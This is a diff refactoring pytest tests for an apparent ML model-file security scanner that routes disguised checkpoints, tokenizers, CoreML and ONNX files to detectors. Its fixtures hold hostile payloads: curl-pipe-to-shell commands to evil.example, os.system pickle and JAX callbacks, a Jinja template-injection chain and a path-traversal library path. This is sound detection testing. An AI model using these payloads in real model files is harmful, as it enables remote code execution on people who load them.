@@ -7509,39 +7230,12 @@ def test_scan_file_routes_malicious_explicit_flax_suffix_to_flax_scanner(tmp_pat
 
 @pytest.mark.parametrize("suffix", [".ckpt", ".checkpoint", ".orbax-checkpoint"])
 def test_scan_file_routes_msgpack_checkpoint_overlap_suffixes_to_flax_scanner(tmp_path: Path, suffix: str) -> None:
-    if not flax_msgpack_scanner.HAS_MSGPACK:
-        pytest.skip("msgpack unavailable")
-
-    checkpoint = tmp_path / f"malicious{suffix}"
-    checkpoint.write_bytes(
-        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
-    )
-
-    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "flax_msgpack"
-    assert result.success is False
-    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+    _assert_flax_overlap_routed(tmp_path, suffix)
 
 
 @pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst", ".ini", ".cfg", ".toml", ".conf"])
 def test_scan_file_routes_malicious_flax_checkpoint_under_skipped_suffix(tmp_path: Path, suffix: str) -> None:
-    if not flax_msgpack_scanner.HAS_MSGPACK:
-        pytest.skip("msgpack unavailable")
-
-    checkpoint = tmp_path / f"malicious{suffix}"
-    checkpoint.write_bytes(
-        flax_msgpack_scanner.msgpack.packb(
-            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
-            use_bin_type=True,
-        )
-    )
-
-    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "flax_msgpack"
-    assert result.success is False
-    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+    _assert_flax_overlap_routed(tmp_path, suffix)
 
 
 @pytest.mark.parametrize(
@@ -10376,19 +10070,12 @@ def test_scan_file_keeps_unreadable_skops_member_inconclusive_in_llamafile_polyg
 
     original_open = zipfile.ZipFile.open
 
-    def open_with_failure(
-        archive: zipfile.ZipFile,
-        name: str | zipfile.ZipInfo,
-        mode: Literal["r", "w"] = "r",
-        pwd: bytes | None = None,
-        *,
-        force_zip64: bool = False,
-    ) -> Any:
-        if isinstance(name, zipfile.ZipInfo) and name.filename == "README.md":
-            raise zipfile.BadZipFile("CRC mismatch")
-        return original_open(archive, name, mode, pwd, force_zip64=force_zip64)
-
-    monkeypatch.setattr(zipfile.ZipFile, "open", open_with_failure)
+    install_zip_open_failure(
+        monkeypatch,
+        original_open,
+        lambda name: isinstance(name, zipfile.ZipInfo) and name.filename == "README.md",
+        lambda: zipfile.BadZipFile("CRC mismatch"),
+    )
 
     result = scan_model_directory_or_file(str(polyglot), cache_enabled=False)
 
@@ -10624,47 +10311,11 @@ def test_scan_file_routes_misnamed_skops_archive_by_bare_schema_content(tmp_path
 
 
 def test_scan_file_does_not_route_nested_bare_schema_near_match_to_skops(tmp_path: Path) -> None:
-    disguised_zip = tmp_path / "nested-schema-near-match.jpg"
-    _create_misnamed_zip(
-        disguised_zip,
-        {
-            "nested/schema": json.dumps(
-                {
-                    "__class__": "Pipeline",
-                    "__module__": "sklearn.pipeline",
-                    "__loader__": "ObjectNode",
-                    "content": {},
-                }
-            ).encode("utf-8"),
-        },
-    )
-
-    result = scan_file(str(disguised_zip))
-
-    assert result.scanner_name == "zip"
-    assert not any("CVE-2025-" in check.name for check in result.checks)
+    _assert_generic_zip_schema_near_match(tmp_path, ("nested-schema-near-match.jpg"), ("nested/schema"))
 
 
 def test_scan_file_does_not_route_near_match_schema_zip_to_skops(tmp_path: Path) -> None:
-    disguised_zip = tmp_path / "schema.jpg"
-    _create_misnamed_zip(
-        disguised_zip,
-        {
-            "schema.json": json.dumps(
-                {
-                    "__class__": "Pipeline",
-                    "__module__": "sklearn.pipeline",
-                    "__loader__": "ObjectNode",
-                    "content": {},
-                }
-            ).encode("utf-8"),
-        },
-    )
-
-    result = scan_file(str(disguised_zip))
-
-    assert result.scanner_name == "zip"
-    assert not any("CVE-2025-" in check.name for check in result.checks)
+    _assert_generic_zip_schema_near_match(tmp_path, ("schema.jpg"), ("schema.json"))
 
 
 def test_scan_file_routes_oversized_misnamed_skops_schema_to_skops(tmp_path: Path) -> None:
@@ -10827,12 +10478,7 @@ def test_scan_file_fails_closed_when_content_routed_keras_zip_scanner_unavailabl
         "cache_dir": str(cache_dir),
         "min_cache_file_size": 0,
     }
-    original_load_scanner = core_module._registry._load_scanner
-
-    def load_scanner(scanner_id: str) -> type[Any] | None:
-        if scanner_id == "keras_zip":
-            return None
-        return original_load_scanner(scanner_id)
+    load_scanner = without_keras_zip_scanner(core_module._registry._load_scanner)
 
     monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)
 
@@ -10882,15 +10528,7 @@ def test_scan_file_bypasses_stale_cache_when_keras_zip_scanner_becomes_unavailab
         "cache_dir": str(cache_dir),
         "min_cache_file_size": 0,
     }
-    original_load_scanner = core_module._registry._load_scanner
-    keras_scanner_available = True
-
-    def load_scanner(scanner_id: str) -> type[Any] | None:
-        if scanner_id == "keras_zip" and not keras_scanner_available:
-            return None
-        return original_load_scanner(scanner_id)
-
-    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)
+    keras_scanner_available = _switch_keras_availability(monkeypatch)
 
     reset_cache_manager()
     try:
@@ -10898,7 +10536,7 @@ def test_scan_file_bypasses_stale_cache_when_keras_zip_scanner_becomes_unavailab
         assert cached.success is True
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0
 
-        keras_scanner_available = False
+        keras_scanner_available[0] = False
         unavailable = scan_file(str(disguised_keras), config=config)
     finally:
         reset_cache_manager()
@@ -10964,15 +10602,7 @@ def test_scan_file_bypasses_outer_archive_cache_when_nested_scanner_becomes_unav
         "cache_dir": str(cache_dir),
         "min_cache_file_size": 0,
     }
-    original_load_scanner = core_module._registry._load_scanner
-    keras_scanner_available = True
-
-    def load_scanner(scanner_id: str) -> type[Any] | None:
-        if scanner_id == "keras_zip" and not keras_scanner_available:
-            return None
-        return original_load_scanner(scanner_id)
-
-    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)
+    keras_scanner_available = _switch_keras_availability(monkeypatch)
 
     reset_cache_manager()
     try:
@@ -10981,7 +10611,7 @@ def test_scan_file_bypasses_outer_archive_cache_when_nested_scanner_becomes_unav
         assert "keras_zip" in cached.metadata["scanner_dependency_ids"]
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0
 
-        keras_scanner_available = False
+        keras_scanner_available[0] = False
         unavailable = scan_file(str(outer_archive), config=config)
     finally:
         reset_cache_manager()
@@ -11006,12 +10636,7 @@ def test_scan_file_disables_advanced_cache_for_unavailable_keras_fallback(
             "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
         },
     )
-    original_load_scanner = core_module._registry._load_scanner
-
-    def load_scanner(scanner_id: str) -> type[Any] | None:
-        if scanner_id == "keras_zip":
-            return None
-        return original_load_scanner(scanner_id)
+    load_scanner = without_keras_zip_scanner(core_module._registry._load_scanner)
 
     def scan_advanced_without_cache(
         path: str,
@@ -11068,12 +10693,7 @@ def test_scan_file_preserves_generic_findings_when_content_routed_keras_zip_scan
             "payload.pkl": _build_malicious_pickle(),
         },
     )
-    original_load_scanner = core_module._registry._load_scanner
-
-    def load_scanner(scanner_id: str) -> type[Any] | None:
-        if scanner_id == "keras_zip":
-            return None
-        return original_load_scanner(scanner_id)
+    load_scanner = without_keras_zip_scanner(core_module._registry._load_scanner)
 
     monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)
 
@@ -11097,32 +10717,7 @@ def test_scan_file_unavailable_keras_scanner_restores_whitelist_downgrade(
             "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
         },
     )
-    original_load_scanner = core_module._registry._load_scanner
-
-    def load_scanner(scanner_id: str) -> type[Any] | None:
-        if scanner_id == "keras_zip":
-            return None
-        return original_load_scanner(scanner_id)
-
-    def scan_with_whitelisted_finding(self: ZipScanner, path: str) -> ScanResult:
-        self.context = UnifiedMLContext(
-            file_path=Path(path),
-            file_size=Path(path).stat().st_size,
-            file_type=".keras",
-            model_id=next(iter(POPULAR_MODELS)),
-            model_source="huggingface",
-        )
-        result = self._create_result()
-        result.add_check(
-            name="Fallback Security Finding",
-            passed=False,
-            message="High confidence fallback anomaly",
-            severity=IssueSeverity.CRITICAL,
-            rule_code="CUSTOM001",
-        )
-        result.finish(success=True)
-        assert result.issues[0].severity == IssueSeverity.INFO
-        return result
+    load_scanner = without_keras_zip_scanner(core_module._registry._load_scanner)
 
     monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)
     monkeypatch.setattr(ZipScanner, "scan", scan_with_whitelisted_finding)
@@ -11778,53 +11373,11 @@ def test_scan_file_reports_visible_jax_pattern_before_oversized_json_exit2(tmp_p
 
 
 def test_scan_file_reports_visible_jax_pattern_after_depth_capped_prefix_value(tmp_path: Path) -> None:
-    model_path = tmp_path / "depth-capped-prefix-large.checkpoint"
-    deep_value: object = "benign"
-    for _ in range(JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH + 1):
-        deep_value = [deep_value]
-    model_path.write_text(
-        json.dumps(
-            {
-                "framework": "jax",
-                "deep": deep_value,
-                "payload": "jax.experimental.io_callback",
-                "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16),
-            }
-        ),
-        encoding="utf-8",
-    )
-
-    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
-
-    assert core_module.determine_exit_code(aggregate) == 1
-    assert any("Suspicious pattern in bounded JSON checkpoint prefix" in issue.message for issue in aggregate.issues)
-    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"
-    assert "mxnet_symbol_routing_incomplete" in aggregate.file_metadata[str(model_path)]["scan_outcome_reasons"]
+    _assert_bounded_jax_prefix_coverage(tmp_path, ("depth-capped-prefix-large.checkpoint"))
 
 
 def test_scan_file_reports_visible_renamed_jax_pattern_behind_inconclusive_mxnet_depth_route(tmp_path: Path) -> None:
-    model_path = tmp_path / "depth-capped-renamed-large.jpg"
-    deep_value: object = "benign"
-    for _ in range(JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH + 1):
-        deep_value = [deep_value]
-    model_path.write_text(
-        json.dumps(
-            {
-                "framework": "jax",
-                "deep": deep_value,
-                "payload": "jax.experimental.io_callback",
-                "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16),
-            }
-        ),
-        encoding="utf-8",
-    )
-
-    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
-
-    assert core_module.determine_exit_code(aggregate) == 1
-    assert any("Suspicious pattern in bounded JSON checkpoint prefix" in issue.message for issue in aggregate.issues)
-    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"
-    assert "mxnet_symbol_routing_incomplete" in aggregate.file_metadata[str(model_path)]["scan_outcome_reasons"]
+    _assert_bounded_jax_prefix_coverage(tmp_path, ("depth-capped-renamed-large.jpg"))
 
 
 def test_scan_file_reports_escaped_renamed_jax_pattern_behind_inconclusive_mxnet_depth_route(tmp_path: Path) -> None:
@@ -12245,33 +11798,11 @@ def test_scan_file_routes_misnamed_executorch_archive_by_content(tmp_path: Path)
 
 
 def test_scan_file_does_not_route_non_pytorch_zip_with_generic_pickle(tmp_path: Path) -> None:
-    disguised_zip = tmp_path / "weights.jpg"
-    _create_misnamed_zip(
-        disguised_zip,
-        {
-            "weights.pkl": pickle.dumps({"weights": [1, 2, 3]}),
-            "version": b"1.0",
-        },
-    )
-
-    result = scan_file(str(disguised_zip))
-
-    assert result.scanner_name == "zip"
+    _assert_generic_zip_pickle_routing(tmp_path, ("weights.jpg"), ("weights.pkl"), (b"1.0"))
 
 
 def test_scan_file_does_not_route_near_match_executorch_zip_without_numeric_version(tmp_path: Path) -> None:
-    disguised_zip = tmp_path / "bytecode.jpg"
-    _create_misnamed_zip(
-        disguised_zip,
-        {
-            "bytecode.pkl": pickle.dumps({"weights": [1, 2, 3]}),
-            "version": b"dev",
-        },
-    )
-
-    result = scan_file(str(disguised_zip))
-
-    assert result.scanner_name == "zip"
+    _assert_generic_zip_pickle_routing(tmp_path, ("bytecode.jpg"), ("bytecode.pkl"), (b"dev"))
 
 
 def test_scan_file_does_not_route_generic_data_pickle_without_pytorch_metadata(tmp_path: Path) -> None:
@@ -12653,16 +12184,7 @@ def test_scan_file_generic_json_hint_before_value_budget_resolves_later_mxnet_st
 def test_scan_file_generic_array_heads_before_value_budget_without_mxnet_structure_uses_existing_owner(
     tmp_path: Path,
 ) -> None:
-    config_path = tmp_path / "config.json"
-    config_path.write_text(
-        '{"heads":["classification"],"padding":[' + ",".join("0" for _ in range(5000)) + "]}",
-        encoding="utf-8",
-    )
-
-    result = scan_file(str(config_path))
-
-    assert result.scanner_name == "manifest"
-    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
+    _assert_generic_json_existing_owner(tmp_path, ('{"heads":["classification"],"padding":['))
 
 
 def test_scan_file_canonical_mxnet_symbol_preserves_xgboost_overlap_analysis(tmp_path: Path) -> None:
@@ -12913,11 +12435,7 @@ def test_scan_file_routes_xgboost_json_with_markers_after_mxnet_probe_budget(
         encoding="utf-8",
     )
 
-    result = scan_file(str(model_path), config={"cache_enabled": False})
-
-    assert result.scanner_name == "xgboost"
-    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
-    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+    _assert_xgboost_json_pattern(model_path)
 
 
 def test_scan_file_fails_closed_for_xgboost_mxnet_json_overlap(
@@ -12968,11 +12486,7 @@ def test_scan_file_xgboost_owned_params_preserves_raw_signature_findings(tmp_pat
         b'"metadata":"\x7fELF"}'
     )
 
-    result = scan_file(str(model_path), config={"cache_enabled": False})
-
-    assert result.scanner_name == "xgboost"
-    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
-    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+    _assert_xgboost_params_signature(model_path)
 
 
 def test_scan_file_xgboost_owned_shadowed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
@@ -12983,11 +12497,7 @@ def test_scan_file_xgboost_owned_shadowed_params_preserves_raw_signature_finding
         b'"metadata":"\x7fELF","nodes":[]}'
     )
 
-    result = scan_file(str(model_path), config={"cache_enabled": False})
-
-    assert result.scanner_name == "xgboost"
-    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
-    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+    _assert_xgboost_params_signature(model_path)
 
 
 def test_scan_file_xgboost_owned_analysis_failed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
@@ -13210,11 +12720,7 @@ def test_scan_file_runs_xgboost_checks_for_bounded_probable_malformed_mxnet_over
         encoding="utf-8",
     )
 
-    result = scan_file(str(model_path), config={"cache_enabled": False})
-
-    assert result.scanner_name == "xgboost"
-    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
-    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+    _assert_xgboost_json_pattern(model_path)
 
 
 def test_scan_file_keeps_benign_mxnet_json_near_match_out_of_xgboost_routing(tmp_path: Path) -> None:
@@ -13697,36 +13203,21 @@ def test_scan_file_whitespace_prefixed_generic_json_without_mxnet_hint_fails_clo
 
 
 def test_scan_file_scalar_heads_generic_json_uses_existing_owner(tmp_path: Path) -> None:
-    config_path = tmp_path / "config.json"
-    config_path.write_text(
-        '{"heads":"main","padding":[' + ",".join("0" for _ in range(5000)) + "]}",
-        encoding="utf-8",
-    )
-
-    result = scan_file(str(config_path))
-
-    assert result.scanner_name == "manifest"
-    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
+    _assert_generic_json_existing_owner(tmp_path, ('{"heads":"main","padding":['))
 
 
 def test_scan_file_fails_closed_for_large_generic_json_with_truncated_duplicate_mxnet_nodes(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-    config_path = tmp_path / "config.json"
-    config_path.write_text(
-        '{"heads":[[0,0,0]],"nodes":[],"padding":"'
-        + ("x" * 256)
-        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
-        '"arg_nodes":[0]}',
-        encoding="utf-8",
+    _assert_truncated_mxnet_routing(
+        tmp_path,
+        monkeypatch,
+        ("config.json"),
+        ('{"heads":[[0,0,0]],"nodes":[],"padding":"'),
+        (256),
+        ('","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],"arg_nodes":[0]}'),
     )
-
-    result = scan_file(str(config_path))
-
-    assert result.success is False
-    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])
 
 
 @pytest.mark.parametrize("initial_nodes", ["[]", "null"])
@@ -13757,77 +13248,57 @@ def test_scan_file_fails_closed_for_generic_json_with_padded_node_object(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-    config_path = tmp_path / "metadata.json"
-    config_path.write_text(
-        '{"nodes":[{"attrs":"'
-        + ("x" * 129)
-        + '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
-        '"arg_nodes":[0],"heads":[[0,0,0]]}',
-        encoding="utf-8",
+    _assert_truncated_mxnet_routing(
+        tmp_path,
+        monkeypatch,
+        ("metadata.json"),
+        ('{"nodes":[{"attrs":"'),
+        (129),
+        (
+            '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+            '"arg_nodes":[0],"heads":[[0,0,0]]}'
+        ),
     )
-
-    result = scan_file(str(config_path))
-
-    assert result.success is False
-    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])
 
 
 def test_scan_file_oversized_generic_json_with_lone_array_heads_fails_closed(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-    config_path = tmp_path / "config.json"
-    config_path.write_text(
-        '{"heads":["classification"],"padding":"' + ("x" * 256) + '"}',
-        encoding="utf-8",
+    _assert_truncated_mxnet_routing(
+        tmp_path, monkeypatch, ("config.json"), ('{"heads":["classification"],"padding":"'), (256), ('"}')
     )
-
-    result = scan_file(str(config_path))
-
-    assert result.success is False
-    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])
 
 
 def test_scan_file_oversized_generic_json_with_mxnet_heads_shape_fails_closed(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-    config_path = tmp_path / "config.json"
-    config_path.write_text(
-        '{"heads":[[0,0,0]],"padding":"'
-        + ("x" * 256)
-        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
-        '"arg_nodes":[0]}',
-        encoding="utf-8",
+    _assert_truncated_mxnet_routing(
+        tmp_path,
+        monkeypatch,
+        ("config.json"),
+        ('{"heads":[[0,0,0]],"padding":"'),
+        (256),
+        ('","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],"arg_nodes":[0]}'),
     )
-
-    result = scan_file(str(config_path))
-
-    assert result.success is False
-    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])
 
 
 def test_scan_file_oversized_generic_json_with_hidden_mxnet_graph_fails_closed(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
-    config_path = tmp_path / "config.json"
-    config_path.write_text(
-        '{"padding":"'
-        + ("x" * 256)
-        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
-        '"arg_nodes":[0],"heads":[[0,0,0]]}',
-        encoding="utf-8",
+    _assert_truncated_mxnet_routing(
+        tmp_path,
+        monkeypatch,
+        ("config.json"),
+        ('{"padding":"'),
+        (256),
+        (
+            '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+            '"arg_nodes":[0],"heads":[[0,0,0]]}'
+        ),
     )
-
-    result = scan_file(str(config_path))
-
-    assert result.success is False
-    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])
 
 
 def test_scan_file_inconclusive_mxnet_config_preserves_jinja_analysis(
@@ -14927,25 +14398,14 @@ def test_scan_file_tokenizer_json_library_jax_identity_composes_jinja_template_a
 
 
 def test_scan_file_tokenizer_json_jax_identity_composes_jinja_template_analysis(tmp_path: Path) -> None:
-    tokenizer_path = _write_ordered_hf_tokenizer_json(
-        tmp_path / "tokenizer.json",
-        late_fields=(
+    _assert_tokenizer_jax_template_composition(
+        tmp_path,
+        ("tokenizer.json"),
+        (
             ',"framework":"jax",'
             '"payload":"jax.experimental.host_callback.call(os.system, \'id\')",'
             '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"'
         ),
-    )
-
-    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "jinja2_template"
-    assert set(result.metadata["scanner_dependency_ids"]) >= {"jinja2_template", "jax_checkpoint"}
-    assert any(
-        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
-    )
-    assert any(
-        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
-        for check in result.checks
     )
 
 
@@ -14985,48 +14445,26 @@ def test_scan_file_tokenizer_json_escaped_long_jax_identity_value_composes_jinja
 
 
 def test_scan_file_extensionless_tokenizer_jax_identity_composes_jinja_template_analysis(tmp_path: Path) -> None:
-    tokenizer_path = _write_ordered_hf_tokenizer_json(
-        tmp_path / "tokenizer",
-        late_fields=(
+    _assert_tokenizer_jax_template_composition(
+        tmp_path,
+        ("tokenizer"),
+        (
             ',"framework":"jax",'
             '"payload":"jax.experimental.host_callback.call(os.system, \'id\')",'
             '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"'
         ),
     )
 
-    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "jinja2_template"
-    assert set(result.metadata["scanner_dependency_ids"]) >= {"jinja2_template", "jax_checkpoint"}
-    assert any(
-        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
-    )
-    assert any(
-        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
-        for check in result.checks
-    )
-
 
 def test_scan_file_tokenizer_json_jax_library_identity_composes_jinja_template_analysis(tmp_path: Path) -> None:
-    tokenizer_path = _write_ordered_hf_tokenizer_json(
-        tmp_path / "tokenizer.json",
-        late_fields=(
+    _assert_tokenizer_jax_template_composition(
+        tmp_path,
+        ("tokenizer.json"),
+        (
             ',"library":"jax",'
             '"payload":"jax.experimental.host_callback.call(os.system, \'id\')",'
             '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"'
         ),
-    )
-
-    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "jinja2_template"
-    assert set(result.metadata["scanner_dependency_ids"]) >= {"jinja2_template", "jax_checkpoint"}
-    assert any(
-        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
-    )
-    assert any(
-        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
-        for check in result.checks
     )
 
 
@@ -15621,33 +15059,11 @@ def test_scan_file_detects_malicious_extensionless_llamafile(tmp_path: Path) -> 
 
 
 def test_scan_file_detects_malicious_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
-    disguised_llamafile = tmp_path / "payload.jpg"
-    disguised_llamafile.write_bytes(
-        b"\x7fELF"
-        + b"\x02\x01\x01\x00"
-        + b"\x00" * 56
-        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
-    )
-
-    result = scan_file(str(disguised_llamafile))
-
-    assert result.scanner_name == "llamafile"
-    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+    _assert_misnamed_llamafile_detection(tmp_path, ("payload.jpg"))
 
 
 def test_scan_file_detects_malicious_llamafile_with_onnx_suffix(tmp_path: Path) -> None:
-    disguised_llamafile = tmp_path / "payload.onnx"
-    disguised_llamafile.write_bytes(
-        b"\x7fELF"
-        + b"\x02\x01\x01\x00"
-        + b"\x00" * 56
-        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
-    )
-
-    result = scan_file(str(disguised_llamafile))
-
-    assert result.scanner_name == "llamafile"
-    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+    _assert_misnamed_llamafile_detection(tmp_path, ("payload.onnx"))
 
 
 def test_scan_file_benign_llamafile_with_onnx_suffix_reports_format_mismatch(tmp_path: Path) -> None:
@@ -15901,37 +15317,11 @@ def test_scan_file_keeps_s901_for_external_data_pt_onnx(tmp_path: Path) -> None:
 
 
 def test_scan_file_keeps_s901_for_malicious_valid_pt_onnx(tmp_path: Path) -> None:
-    pytest.importorskip("onnx")
-    disguised_onnx = _create_budgeted_onnx_candidate(tmp_path / "malicious.pt", op_type="PythonOp")
-
-    result = scan_file(str(disguised_onnx), config={"cache_enabled": False})
-    format_check = _format_validation_check(result)
-
-    assert result.scanner_name == "onnx"
-    assert format_check.severity == IssueSeverity.WARNING
-    assert format_check.rule_code == "S901"
-    assert _actionable_s901_issues(result)
-    assert any(
-        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
-        for issue in result.issues
-    )
+    _assert_malicious_misnamed_onnx_format_issue(tmp_path, ("malicious.pt"))
 
 
 def test_scan_file_keeps_s901_for_malicious_valid_pth_onnx(tmp_path: Path) -> None:
-    pytest.importorskip("onnx")
-    disguised_onnx = _create_budgeted_onnx_candidate(tmp_path / "malicious.pth", op_type="PythonOp")
-
-    result = scan_file(str(disguised_onnx), config={"cache_enabled": False})
-    format_check = _format_validation_check(result)
-
-    assert result.scanner_name == "onnx"
-    assert format_check.severity == IssueSeverity.WARNING
-    assert format_check.rule_code == "S901"
-    assert _actionable_s901_issues(result)
-    assert any(
-        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
-        for issue in result.issues
-    )
+    _assert_malicious_misnamed_onnx_format_issue(tmp_path, ("malicious.pth"))
 
 
 def test_scan_file_keeps_s901_when_malicious_pt_onnx_finding_is_suppressed(tmp_path: Path) -> None:
@@ -16303,20 +15693,7 @@ def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
 
 @pytest.mark.parametrize("prefix", [b"", b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06"])
 def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Path, prefix: bytes) -> None:
-    disguised_coreml = create_mock_coreml(
-        tmp_path / "malicious.jpg",
-        custom_class="EvilRuntimeLayer",
-        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
-    )
-    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())
-
-    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "coreml"
-    assert any(
-        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
-        for issue in result.issues
-    )
+    _assert_misnamed_coreml_custom_layer(tmp_path, prefix, ("malicious.jpg"))
 
 
 @pytest.mark.parametrize(
@@ -16328,20 +15705,7 @@ def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Pat
     ids=["top-level-field-budget", "unknown-group-budget"],
 )
 def test_scan_file_detects_malicious_budget_exhausted_renamed_coreml(tmp_path: Path, prefix: bytes) -> None:
-    disguised_coreml = create_mock_coreml(
-        tmp_path / "budgeted.jpg",
-        custom_class="EvilRuntimeLayer",
-        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
-    )
-    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())
-
-    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "coreml"
-    assert any(
-        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
-        for issue in result.issues
-    )
+    _assert_misnamed_coreml_custom_layer(tmp_path, prefix, ("budgeted.jpg"))
 
 
 def test_scan_file_detects_malicious_prefixed_renamed_onnx_by_content(tmp_path: Path) -> None:
@@ -16550,31 +15914,11 @@ def test_scan_file_detects_malicious_renamed_tf_function_metagraph_by_content(tm
 
 
 def test_scan_file_detects_malicious_renamed_tf_savedmodel_by_content(tmp_path: Path) -> None:
-    disguised_savedmodel = tmp_path / "saved.jpg"
-    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())
-
-    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "tf_savedmodel"
-    assert result.success is False
-    assert any(
-        issue.severity == IssueSeverity.CRITICAL and "PyFunc operation detected" in issue.message
-        for issue in result.issues
-    )
+    _assert_misnamed_tf_savedmodel_detection(tmp_path, ("saved.jpg"))
 
 
